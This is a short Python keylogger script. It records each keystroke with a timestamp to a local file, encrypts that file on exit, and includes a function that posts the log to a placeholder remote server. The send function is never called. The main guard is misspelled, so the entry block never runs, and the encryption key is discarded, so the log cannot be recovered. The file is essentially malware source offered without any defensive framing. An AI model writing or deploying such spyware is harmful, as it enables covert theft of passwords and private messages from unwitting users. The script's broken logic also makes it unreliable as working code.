from pynput import keyboard
from cryptography.fernet import Fernet
import logging
import requests
import os
from datetime import datetime


encryption_key = Fernet.generate_key()
cipher_suite = Fernet(encryption_key)
log_file = "keylog.txt"

# logging
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

def encrypt_file(file_path):
    """Encrypt the log file."""
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        encrypted_data = cipher_suite.encrypt(file_data)
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
    except Exception as e:
        logging.error(f'Error encrypting file: {e}')

def send_log(log_data):
    """Send logs to a remote server."""
    url = 'https://your-server.com/log'  # Replace with your server URL
    try:
        response = requests.post(url, data={'log': log_data})
        response.raise_for_status()
    except requests.RequestException as e:
        logging.error(f'Error sending log: {e}')

def on_press(key):
    """Handle key press events."""
    try:
        key_str = f'{key.char}'
    except AttributeError:
        key_str = f'{key}'
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f'{timestamp} - {key_str}'
    logging.info(log_entry)
    

def on_release(key):
    """Handle key release events."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

if _name_ == "_main_":
    try:
        # Start the keylogger
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        logging.error(f'Error starting keylogger: {e}')
    finally:
        # log file upon exit
        encrypt_file(log_file)
